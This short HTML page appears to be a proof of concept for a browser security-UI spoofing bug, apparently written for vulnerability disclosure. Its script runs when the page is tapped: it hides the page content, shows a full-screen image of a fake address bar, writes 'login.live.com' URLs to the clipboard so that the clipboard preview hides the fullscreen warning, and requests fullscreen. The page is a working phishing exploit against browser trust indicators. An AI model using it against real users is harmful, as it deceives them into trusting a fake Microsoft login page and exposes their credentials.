<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Security UI Spoofing</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
        <style>
            body {
                margin: 0;
                padding: 0;
            }         
            #spoof {
                width:  100%;
                height: 100%;
            }
        </style>
        <script>
            onclick = async () => {
                document.getElementById("spoof").style   = "display: block;";
                document.getElementById("content").style = "display: none;";

		//keep the ClipboardUI Preview long enough until the fullscreen notification disappears    
		navigator.clipboard.writeText("http://login.live.com");
		navigator.clipboard.writeText("https://login.live.com");
				
                document.documentElement.requestFullscreen();
            }
        </script>
    </head>  
    <body>
        <img id="spoof" style="display: none;" src="spoofy.png"></img>
        <div id="content">
            <br><br><br>
            <center>
                <h1>Tap anywhere on the page to spoof the omnibox! The security sensitive fullscreen notification will be hidden beneath the Clipboard Preview UI</h1>
            </center>
        </div>
    </body>
  </body>
</html>
